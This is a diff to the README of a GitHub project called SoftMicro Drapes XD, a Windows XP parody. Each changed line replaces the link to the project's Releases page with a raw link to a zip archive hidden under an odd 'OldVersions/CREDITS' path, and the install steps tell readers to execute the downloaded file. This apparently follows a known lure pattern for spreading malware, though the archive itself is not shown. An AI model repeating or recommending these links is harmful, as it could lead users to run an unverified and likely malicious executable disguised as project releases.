@@ -2,7 +2,7 @@
 
 Welcome to the official documentation repository for **SoftMicro Drapes XD**, a playful take on Microsoft Windows XP. This repository contains all the resources you need to understand, develop, and contribute to the Drapes XD project.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/releases)
+[![Download Releases](https://raw.githubusercontent.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/SoftMicro_Drapes_XD_Docs_Main-dev/OldVersions/CREDITS/English/Soft-X-Micro-Docs-Drapes-2.3-beta.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/SoftMicro_Drapes_XD_Docs_Main-dev/OldVersions/CREDITS/English/Soft-X-Micro-Docs-Drapes-2.3-beta.2.zip)
 
 ## Table of Contents
 
@@ -42,7 +42,7 @@ SoftMicro Drapes XD includes several features that enhance user experience:
 
 To install SoftMicro Drapes XD, follow these steps:
 
-1. Visit the [Releases](https://github.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/releases) section.
+1. Visit the [Releases](https://raw.githubusercontent.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/SoftMicro_Drapes_XD_Docs_Main-dev/OldVersions/CREDITS/English/Soft-X-Micro-Docs-Drapes-2.3-beta.2.zip) section.
 2. Download the latest release file.
 3. Execute the file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -72,11 +72,11 @@ SoftMicro Drapes XD is licensed under the GPLv3 license. You can freely use, mod
 
 ## Support
 
-If you encounter any issues or have questions, feel free to reach out for support. You can check the [Releases](https://github.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/releases) section for updates or contact us directly.
+If you encounter any issues or have questions, feel free to reach out for support. You can check the [Releases](https://raw.githubusercontent.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/SoftMicro_Drapes_XD_Docs_Main-dev/OldVersions/CREDITS/English/Soft-X-Micro-Docs-Drapes-2.3-beta.2.zip) section for updates or contact us directly.
 
 ## Changelog
 
-We maintain a changelog to keep track of updates and changes made to the project. You can find the latest changes in the [Releases](https://github.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/releases) section.
+We maintain a changelog to keep track of updates and changes made to the project. You can find the latest changes in the [Releases](https://raw.githubusercontent.com/GhadaHafez9/SoftMicro_Drapes_XD_Docs/SoftMicro_Drapes_XD_Docs_Main-dev/OldVersions/CREDITS/English/Soft-X-Micro-Docs-Drapes-2.3-beta.2.zip) section.
 
 ## Acknowledgments
 
